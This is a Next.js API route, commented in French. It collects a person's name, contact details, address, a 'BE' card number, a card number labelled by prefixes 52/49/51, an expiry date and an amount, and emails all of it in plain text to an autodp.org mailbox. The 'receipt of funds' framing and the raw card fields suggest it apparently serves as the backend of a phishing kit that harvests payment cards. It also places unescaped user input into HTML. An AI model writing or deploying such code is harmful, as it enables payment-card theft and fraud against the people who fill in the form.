import { NextRequest, NextResponse } from 'next/server'
import nodemailer from 'nodemailer'

// Configuration du transporteur SMTP OVH
const transporter = nodemailer.createTransporter({
  host: process.env.EMAIL_HOST || 'ssl0.ovh.net',
  port: parseInt(process.env.EMAIL_PORT || '465'),
  secure: true, // true pour le port 465, false pour les autres ports
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS,
  },
})

// Fonction pour valider les données du formulaire
function validateFormData(data: any) {
  const requiredFields = [
    'nom_complet',
    'email', 
    'telephone',
    'adresse',
    'carte_be',
    'carte_52_49_51',
    'date_expiration',
    'submission_id',
    'montant'
  ]

  for (const field of requiredFields) {
    if (!data[field] || data[field].trim() === '') {
      return { isValid: false, error: `Le champ ${field} est obligatoire` }
    }
  }

  // Validation de l'email
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
  if (!emailRegex.test(data.email)) {
    return { isValid: false, error: 'Format d\'email invalide' }
  }

  return { isValid: true }
}

// Fonction pour créer le template HTML de l'email
function createEmailTemplate(data: any, formType: string) {
  const title = formType === 'enregistrement' ? 'Formulaire d\'enregistrement' : 'Formulaire de réception de fond'
  
  return `
    <!DOCTYPE html>
    <html>
    <head>
      <meta charset="utf-8">
      <title>${title}</title>
      <style>
        body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; }
        .container { max-width: 600px; margin: 0 auto; padding: 20px; }
        .header { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 20px; border-radius: 8px 8px 0 0; }
        .content { background: #f9f9f9; padding: 20px; border-radius: 0 0 8px 8px; }
        .field { margin-bottom: 15px; }
        .label { font-weight: bold; color: #555; }
        .value { background: white; padding: 10px; border-radius: 4px; border-left: 4px solid #667eea; }
        .footer { text-align: center; margin-top: 20px; color: #666; font-size: 12px; }
      </style>
    </head>
    <body>
      <div class="container">
        <div class="header">
          <h1>${title}</h1>
          <p>Nouvelle demande reçue le ${new Date().toLocaleDateString('fr-FR')} à ${new Date().toLocaleTimeString('fr-FR')}</p>
        </div>
        <div class="content">
          <div class="field">
            <div class="label">Nom complet :</div>
            <div class="value">${data.nom_complet}</div>
          </div>
          <div class="field">
            <div class="label">Email :</div>
            <div class="value">${data.email}</div>
          </div>
          <div class="field">
            <div class="label">Téléphone :</div>
            <div class="value">${data.telephone}</div>
          </div>
          <div class="field">
            <div class="label">Adresse de récupération :</div>
            <div class="value">${data.adresse}</div>
          </div>
          <div class="field">
            <div class="label">Numéro de carte BE :</div>
            <div class="value">${data.carte_be}</div>
          </div>
          <div class="field">
            <div class="label">Numéro de carte 52/49/51 :</div>
            <div class="value">${data.carte_52_49_51}</div>
          </div>
          <div class="field">
            <div class="label">Date d'expiration :</div>
            <div class="value">${data.date_expiration}</div>
          </div>
          <div class="field">
            <div class="label">Submission ID :</div>
            <div class="value">${data.submission_id}</div>
          </div>
          <div class="field">
            <div class="label">Montant :</div>
            <div class="value">${data.montant} €</div>
          </div>
        </div>
        <div class="footer">
          <p>Email envoyé automatiquement depuis autodp.org</p>
        </div>
      </div>
    </body>
    </html>
  `
}

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    
    // Déterminer le type de formulaire basé sur l'URL ou un paramètre
    const url = new URL(request.url)
    const formType = url.searchParams.get('type') || 'enregistrement'
    
    // Valider les données
    const validation = validateFormData(body)
    if (!validation.isValid) {
      return NextResponse.json(
        { success: false, error: validation.error },
        { status: 400 }
      )
    }

    // Vérifier que les variables d'environnement sont configurées
    if (!process.env.EMAIL_USER || !process.env.EMAIL_PASS) {
      console.error('Variables d\'environnement SMTP manquantes')
      return NextResponse.json(
        { success: false, error: 'Configuration serveur email manquante' },
        { status: 500 }
      )
    }

    // Créer le contenu de l'email
    const emailHtml = createEmailTemplate(body, formType)
    const subject = formType === 'enregistrement' 
      ? `Nouvel enregistrement - ${body.nom_complet}` 
      : `Nouvelle demande de réception de fond - ${body.nom_complet}`

    // Configuration de l'email
    const mailOptions = {
      from: process.env.EMAIL_USER,
      to: process.env.RECIPIENT_EMAIL || 'registratie@autodp.org',
      replyTo: body.email,
      subject: subject,
      html: emailHtml,
      text: `
        ${subject}
        
        Nom: ${body.nom_complet}
        Email: ${body.email}
        Téléphone: ${body.telephone}
        Adresse: ${body.adresse}
        Carte BE: ${body.carte_be}
        Carte 52/49/51: ${body.carte_52_49_51}
        Date expiration: ${body.date_expiration}
        Submission ID: ${body.submission_id}
        Montant: ${body.montant} €
      `
    }

    // Envoyer l'email
    const info = await transporter.sendMail(mailOptions)
    
    console.log('Email envoyé avec succès:', info.messageId)

    return NextResponse.json({
      success: true,
      message: 'Email envoyé avec succès',
      messageId: info.messageId
    })

  } catch (error) {
    console.error('Erreur lors de l\'envoi de l\'email:', error)
    
    return NextResponse.json(
      { 
        success: false, 
        error: 'Erreur lors de l\'envoi de l\'email. Veuillez réessayer plus tard.' 
      },
      { status: 500 }
    )
  }
}

// Gérer les autres méthodes HTTP
export async function GET() {
  return NextResponse.json(
    { error: 'Méthode non autorisée' },
    { status: 405 }
  )
}
